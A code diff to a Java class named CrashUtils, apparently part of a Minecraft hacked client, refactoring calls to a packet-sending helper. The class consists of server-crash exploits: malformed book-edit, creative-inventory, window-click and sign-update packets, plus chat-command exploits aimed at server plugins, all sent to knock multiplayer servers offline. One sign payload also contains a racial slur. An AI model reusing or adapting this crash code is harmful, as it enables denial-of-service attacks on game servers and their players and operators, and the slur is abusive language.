@@ -70,7 +70,7 @@ public class CrashUtils {
     }
 
     public void oneBlockCrash(ItemStack stack) {
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C08PacketPlayerBlockPlacement
+        PacketUtils.sendPacketNoEvent(new C08PacketPlayerBlockPlacement
                 (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                         , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f));
     }
@@ -78,41 +78,41 @@ public class CrashUtils {
     public void payload1(ItemStack stack) {
         PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
         packetBuffer.writeItemStackToBuffer(stack);
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
+        PacketUtils.sendPacketNoEvent(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
     }
 
     public void payload2(ItemStack stack) {
         PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
         packetBuffer.writeItemStackToBuffer(stack);
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C17PacketCustomPayload(buffertype[ThreadLocalRandom.current().nextInt(1)], packetBuffer));
+        PacketUtils.sendPacketNoEvent(new C17PacketCustomPayload(buffertype[ThreadLocalRandom.current().nextInt(1)], packetBuffer));
     }
 
     public void creatandpayload(ItemStack stack) {
         PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
         packetBuffer.writeItemStackToBuffer(stack);
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, stack));
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
+        PacketUtils.sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, stack));
+        PacketUtils.sendPacketNoEvent(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
     }
 
     public void creatandplace(ItemStack stack) {
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, stack));
-        PacketUtils.INSTANCE.sendPacketNoEvent((new C08PacketPlayerBlockPlacement
+        PacketUtils.sendPacketNoEvent(new C10PacketCreativeInventoryAction(0, stack));
+        PacketUtils.sendPacketNoEvent((new C08PacketPlayerBlockPlacement
                 (new BlockPos(Minecraft.getMinecraft().thePlayer.posX, Minecraft.getMinecraft().thePlayer.posY - new Random().nextFloat() - 1.0f, Minecraft.getMinecraft().thePlayer.posZ)
                         , new Random().nextInt(255), stack, 0.0f, 0.0f, 0.0f)));
     }
 
     public void click(ItemStack stack) {
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C0EPacketClickWindow
+        PacketUtils.sendPacketNoEvent(new C0EPacketClickWindow
                 (0, Integer.MIN_VALUE, 0, 0, stack, (short) 0));
     }
 
     public void creatandclick(ItemStack stack) {
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction(Integer.MIN_VALUE, stack));
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 3, stack, (short) 0));
+        PacketUtils.sendPacketNoEvent(new C10PacketCreativeInventoryAction(Integer.MIN_VALUE, stack));
+        PacketUtils.sendPacketNoEvent(new C0EPacketClickWindow(0, Integer.MIN_VALUE, 0, 3, stack, (short) 0));
     }
 
     public void justcreate(ItemStack stack) {
-        PacketUtils.INSTANCE.sendPacketNoEvent(new C10PacketCreativeInventoryAction
+        PacketUtils.sendPacketNoEvent(new C10PacketCreativeInventoryAction
                 (-999, stack));
     }
 
@@ -130,14 +130,14 @@ public class CrashUtils {
         try {
             switch (CrashType.toLowerCase()) {
                 case "pex": //Pex (outdated)
-                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(pexcrashexp1));
-                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(pexcrashexp2));
+                    PacketUtils.sendPacketNoEvent(new C01PacketChatMessage(pexcrashexp1));
+                    PacketUtils.sendPacketNoEvent(new C01PacketChatMessage(pexcrashexp2));
                     break;
                 case "fawe": //Old Fawe  (outdated)
-                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(fawe));
+                    PacketUtils.sendPacketNoEvent(new C01PacketChatMessage(fawe));
                     break;
                 case "mv": //Mv (outdated)
-                    PacketUtils.INSTANCE.sendPacketNoEvent(new C01PacketChatMessage(mv));
+                    PacketUtils.sendPacketNoEvent(new C01PacketChatMessage(mv));
                     break;
                 case "position":
                     custombyte(value);
@@ -145,10 +145,10 @@ public class CrashUtils {
                 case "rsc1":
                     IChatComponent[] iTextComponentArray = new IChatComponent[]{new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText(""), new ChatComponentText("")};
                     iTextComponentArray[0] = new ChatComponentText(pdw);
-                    PacketUtils.INSTANCE.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN, iTextComponentArray));
+                    PacketUtils.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN, iTextComponentArray));
                     break;
                 case "rsc2":
-                    PacketUtils.INSTANCE.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN,
+                    PacketUtils.sendPacketNoEvent(new C12PacketUpdateSign(BlockPos.ORIGIN,
                             new IChatComponent[]{new ChatComponentText(pdw2), new ChatComponentText("nigga"), new ChatComponentText("doyoulovemekid"), new ChatComponentText("ezmyfriend")}));
                     break;
                 case "netty":
@@ -157,7 +157,7 @@ public class CrashUtils {
                 default:
                     ClientUtils.INSTANCE.displayChatMessage("Couldn't Find the Crash Type");
             }
-        } catch (Exception e) {
+        } catch (Exception ignored) {
 
         }
     }
